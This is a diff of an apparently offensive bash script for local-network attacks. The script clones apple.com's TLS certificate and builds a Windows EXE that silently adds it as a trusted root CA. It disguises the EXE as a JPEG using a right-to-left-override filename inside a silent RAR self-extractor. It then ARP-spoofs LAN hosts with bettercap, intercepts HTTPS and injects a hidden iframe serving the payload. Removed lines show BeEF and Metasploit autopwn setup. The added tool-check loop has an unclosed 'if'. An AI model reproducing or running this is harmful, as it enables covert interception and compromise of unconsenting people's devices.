@@ -35,14 +35,17 @@ color_print() {
 [[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT..."; exit 1; }
 
 # --- Kill previous BeEF/Metasploit processes ---
-pkill -f 'ngrok|ruby|msfconsole|apache2';wait
+pkill -f 'ngrok|ruby|msfconsole|apache2'
 
 # --- Tool Check ---
-for i in wget openssl metasploit-framework beef-xss apache2 bettercap arp-scan; do
+for i in wget openssl metasploit-framework apache2 bettercap arp-scan rar python3 python3-pip; do
   if ! command -v "$i" &>/dev/null; then
     color_print RED "[X] $i NOT installed!"
     apt install -y $i
   fi
+
+  if ! command -v "pyinstaller" &>/dev/null; then
+    pip3 install pyinstaller --break-system-packages
 done
 
 # --- Detect interface + LAN IP ---
@@ -50,83 +53,46 @@ IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
 LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
 [[ -z "$IFACE" || -z "$LAN" ]] && { color_print RED "[X] Interface or IP detection failed"; exit 1; }
 
-# --- Start Metasploit ---
-color_print GREEN "[*] Starting Metasploit..."
-msfconsole -qx "load msgrpc ServerHost=${LAN} Pass=abc123 SSL=y; use auxiliary/server/browser_autopwn2; set LHOST $LAN; set URIPATH /pwn; run -z" &>/dev/null &
-
-# --- Configure BeEF ---
-color_print GREEN "[*] Updating BeEF config..."
-CONFIG_YAML="/usr/share/beef-xss/config.yaml"
-METASPLOIT_YAML="/usr/share/beef-xss/extensions/metasploit/config.yaml"
-AUTOPWN_YAML="/usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml"
-EVASION_YAML="/usr/share/beef-xss/extensions/evasion/config.yaml"
-
-# Main BeEF config
-if grep -q 'https: false' "$CONFIG_YAML"; then
-  sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
-         -e 's|passwd: "beef"|passwd: "00980098"|g' \
-         -e 's|# public:|public:|g' \
-         -e 's|#     host: "" # public|     host: "'$LAN'" # public|' \
-         -e 's|#     port: "" # public|     port: "443" # public|g' \
-         -e 's|#     https: false|     https: true|g' \
-         -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
-         -e 's|hook.js|jqueryctl.js|g' \
-         -e 's|BEEFHOOK|UNKSESSION|g' "$CONFIG_YAML"
-else
-  sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
-         -e 's|passwd: "beef"|passwd: "00980098"|g' \
-         -e 's|# public:|public:|g' \
-         -e 's|host: ".*" # public|host: "'$LAN'" # public|' \
-         -e 's|port: ".*" # public|port: "443" # public|g' \
-         -e 's|https: false|https: true|g' \
-         -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
-         -e 's|hook.js|jqueryctl.js|g' \
-         -e 's|BEEFHOOK|UNKSESSION|g' "$CONFIG_YAML"
-fi
-
-# Metasploit extension config
-sed -i -e 's|enable: false|enable: true|g' \
-       -e 's|host: ".*"|host: "'$LAN'"|g' \
-       -e 's|callback_host: ".*"|callback_host: "'$LAN'"|g' \
-       -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' "$METASPLOIT_YAML"
-
-# Enable modules
-sed -i -e 's|enable: false|enable: true|g' "$AUTOPWN_YAML"
-sed -i -e 's|enable: false|enable: true|g' "$EVASION_YAML"
-
-# --- Start BeEF ---
-color_print GREEN "[*] Starting BeEF..."
-cd /usr/share/beef-xss && ./beef -x &>/dev/null &
-
 # --- Generate fake CA ---
-CERT_DIR="$HOME/.bettercap/certs"
-mkdir -p "$CERT_DIR"
+rm -rf /home/$USER/.msf4/loot/*
+msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS apple.com;run;exit"
+CERT_CRT=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.crt" -printf "%f\n" | head -n 1)
+CERT_KEY=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.key" -printf "%f\n" | head -n 1)
+cp "$CERT_CRT" "/var/www/html/apple.crt"
 
-CERT_KEY="$CERT_DIR/bettercap.key"
-CERT_CRT="$CERT_DIR/bettercap.crt"
-CERT_PEM="$CERT_DIR/bettercap-ca.pem"
+# --- Download and Process Image ---
+wget "https://www.apple.com/v/iphone-16-pro/f/images/overview/product-viewer/iphone-pro/all_colors__fdpduog7urm2_large_2x.jpg" -O /tmp/apple.jpg
+convert "/tmp/apple.jpg" -define icon:auto-resize=256,128,64,48,32,16 "/tmp/apple.ico"
 
-if [[ ! -f "$CERT_PEM" ]]; then
-  color_print YELLOW "[*] Generating fake CA certificate..."
-  openssl req -x509 -newkey rsa:2048 -nodes \
-    -keyout "$CERT_KEY" \
-    -out "$CERT_CRT" \
-    -days 3650 \
-    -subj "/CN=Bettercap MITM Proxy"
-  cat "$CERT_CRT" "$CERT_KEY" > "$CERT_PEM"
-  color_print GREEN "[✓] Fake CA created: $CERT_PEM"
-else
-  color_print GREEN "[✓] Existing fake CA found: $CERT_PEM"
-fi
+# --- Generate EXE Installer for CA ---
+cat > /tmp/cert_installer.py << EOF
+import os, subprocess, tempfile, base64
+
+crt = """$(base64 -w0 /var/www/html/apple.crt)"""
+path = os.path.join(tempfile.gettempdir(), "apple.crt")
+with open(path, "wb") as f:
+    f.write(base64.b64decode(crt))
+
+try:
+    subprocess.call(["certutil", "-addstore", "-f", "Root", path])
+except:
+    pass
+EOF
+
+pyinstaller --onefile --noconfirm --icon "/tmp/apple.ico" "/tmp/cert_installer.py"
+cp ~/dist/cert_installer.exe "/tmp/apple_update.exe"
+
+# --- SFX Packing ---
+cat > /tmp/sfx.txt << EOF
+Setup=apple_update.exe
+Silent=1
+Overwrite=1
+Title=Apple Certificate Updater
+EOF
+rar a -sfx -z"/tmp/sfx.txt" "/var/www/html/apple_update-%E2%80%AEexe.jpg" "/tmp/apple_update.exe" /tmp/apple.jpg
 
 # --- Serve the cert over HTTP ---
-cp "$CERT_CRT" "/var/www/html/apple.crt"
-service apache2 start;service postgresql start
-
-# --- Final Info ---
-color_print GREEN "[*] BeEF Panel: http://$LAN/ui/panel"
-color_print GREEN "[*] BeEF USER: unk9vvn | PASS: 00980098"
-color_print GREEN "[*] BeEF > Commands > Misc > Create Invisible Iframe > URL: http://$LAN:8080/pwn > Execute"
+service apache2 start
 
 # --- Scan network ---
 color_print CYAN "[*] Scanning LAN to find targets..."
@@ -135,7 +101,6 @@ TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{
 
 # --- Run Bettercap ---
 color_print GREEN "[*] Starting Bettercap MITM attack..."
-
 bettercap -iface "$IFACE" -eval "\
 set arp.spoof.targets $TARGETS; \
 set arp.spoof.internal true; \
@@ -143,8 +108,7 @@ set https.proxy.engine true; \
 set https.proxy.sslstrip false; \
 set https.proxy.cert $CERT_CRT; \
 set https.proxy.key $CERT_KEY; \
-set http.proxy.injectjs https://$LAN/jqueryctl.js; \
-set http.proxy.injecthtml '<iframe src=\"http://$LAN:8080/pwn\" width=0 height=0 style=\"display:none\"></iframe>'; \
+set http.proxy.injecthtml '<iframe src=\"http://$LAN/apple_update-%E2%80%AEexe.jpg\" width=0 height=0 style=\"display:none\"></iframe>'; \
 set net.sniff.verbose true; \
 set net.sniff.output /tmp/bettercap.log; \
 net.sniff on; http.proxy on; https.proxy on; arp.spoof on"
